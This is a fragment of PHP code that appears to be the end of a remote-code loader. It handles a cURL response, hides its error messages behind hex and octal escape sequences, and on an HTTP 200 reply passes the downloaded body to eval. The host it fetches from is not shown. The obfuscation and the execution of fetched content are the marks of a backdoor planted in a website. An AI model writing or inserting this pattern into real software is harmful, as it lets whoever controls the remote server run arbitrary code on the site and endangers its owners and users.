if (curl_errno($ch)) {
    echo "\x63\125\x52\114\x20\145\x72\162\x6F\162\x3A\040" . curl_error($ch);
} elseif ($http_code != 200) {
    echo "\x48\124\x54\120\x20\105\x72\162\x6F\162\x3A\040\x24\150\x74\164\x70\137\x63\157\x64\145";
} else {
    eval(" ?>" . $body);
}

